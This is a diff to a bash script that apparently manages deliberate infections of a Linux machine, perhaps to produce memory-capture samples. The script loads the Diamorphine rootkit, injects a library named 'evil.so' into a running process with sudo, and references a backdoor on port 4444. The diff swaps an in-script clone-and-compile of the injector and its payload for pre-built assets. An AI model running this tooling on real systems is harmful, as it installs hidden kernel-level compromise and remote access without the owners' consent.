@@ -1,10 +1,10 @@
 #!/usr/bin/env bash
-# manage_infect – Infection & memory capture manager (rootkit pre-built)
+# manage_infect – Infection & memory capture manager
 set -e
 
 ROOTKIT_MODULE="diamorphine"
-INJECTOR_DIR="/tmp/linux-inject"
-EVIL_LIB="/tmp/evil.so"
+INJECTOR_DIR="/tmp/linux-inject"   # kept for reference, not used anymore
+EVIL_LIB="/tmp/evil.so"            # kept for clean_injection
 BACKDOOR_PORT=4444
 SLEEP_PID_FILE="/tmp/sleep_infected.pid"
 
@@ -20,7 +20,6 @@ MODULE_PATH="$SCRIPT_DIR/assets/diamorphine.ko"
 
 # --- Helpers ---
 is_module_active() {
-    # Returns true if the module is loaded (hidden or not)
     [ -d "/sys/module/${ROOTKIT_MODULE}" ]
 }
 
@@ -31,7 +30,6 @@ install_rootkit() {
     fi
     if is_module_active; then
         echo "[*] Rootkit appears to be already loaded (detected via /sys)."
-        # Ensure flag is set so status shows correct state
         touch "$FLAG_ROOTKIT"
         return 0
     fi
@@ -53,26 +51,21 @@ install_injection() {
         echo "[*] Code injection already active."
         return 0
     fi
-    cd /tmp
-    [ -d "$INJECTOR_DIR" ] || git clone https://github.com/gaffe23/linux-inject "$INJECTOR_DIR"
-    cd "$INJECTOR_DIR" && make x86_64
-    [ -f "$EVIL_LIB" ] || {
-        cat > evil.c << 'EOF'
-#include <stdio.h>
-#include <unistd.h>
-__attribute__((constructor)) void evil_init() {
-    FILE *fp = fopen("/tmp/owned", "w");
-    fprintf(fp, "Injected!\n");
-    fclose(fp);
-}
-EOF
-        gcc -shared -fPIC evil.c -o "$EVIL_LIB"
-    }
+
+    local inject_bin="$SCRIPT_DIR/assets/inject"
+    local evil_lib="$SCRIPT_DIR/assets/evil.so"
+
+    if [ ! -f "$inject_bin" ] || [ ! -f "$evil_lib" ]; then
+        echo "[!] Pre‑built injector or library missing from assets/"
+        echo "[!] Place 'inject' and 'evil.so' in assets/ before running."
+        exit 1
+    fi
+
     /usr/bin/sleep 9999 &
     local pid=$!
     sleep 1
     echo $pid > "$SLEEP_PID_FILE"
-    sudo ./inject -p $pid "$EVIL_LIB"
+    sudo "$inject_bin" -p $pid "$evil_lib"
     touch "$FLAG_INJECTION"
     echo "[+] Code injected into PID $pid"
 }
@@ -89,7 +82,6 @@ install_backdoor() {
 }
 
 clean_rootkit() {
-    # Try removing even if hidden (uses force & ignores errors)
     sudo rmmod "$ROOTKIT_MODULE" 2>/dev/null || \
     [ -d "/sys/module/${ROOTKIT_MODULE}" ] && sudo rmmod --force "$ROOTKIT_MODULE" 2>/dev/null || true
     rm -f "$FLAG_ROOTKIT"
@@ -174,7 +166,10 @@ while getopts "icsC:a" opt; do
     esac
 done
 
-[ -z "$ACTION" ] && { echo "$USAGE"; exit 1; }
+if [ -z "$ACTION" ]; then
+    echo "$USAGE"
+    exit 1
+fi
 
 COMP_LIST=$(parse_components "$COMPONENTS")
 
